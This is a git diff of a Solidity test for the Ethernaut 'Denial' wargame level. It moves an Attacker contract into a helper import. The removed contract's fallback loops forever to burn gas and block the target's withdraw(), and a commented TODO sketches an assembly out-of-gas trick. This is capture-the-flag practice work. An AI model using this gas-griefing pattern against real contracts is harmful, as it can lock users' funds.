@@ -3,6 +3,7 @@ pragma solidity ^0.8.13;
 
 import {Test} from "forge-std/Test.sol";
 import {Denial} from "ethernaut/levels/Denial.sol";
+import {Attacker} from "~/helpers/Denial.sol";
 
 contract DenialTest is Test {
     Denial target;
@@ -33,16 +34,5 @@ contract DenialTest is Test {
         uint256 maxGas = 1_000_000; // maximum 1M gas allowed for withdraw
         (bool ok,) = address(target).call{gas: maxGas}(abi.encodeWithSelector(target.withdraw.selector, [""]));
         assertFalse(ok, "withdraw() must have failed");
-    }
-}
-
-contract Attacker {
-    fallback() external payable {
-        while (true) {}
-
-        // TODO: do the shortest out-of-gas trick here, it was something like this?
-        // assembly {
-        //     pop(mload(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff))
-        // }
     }
 }
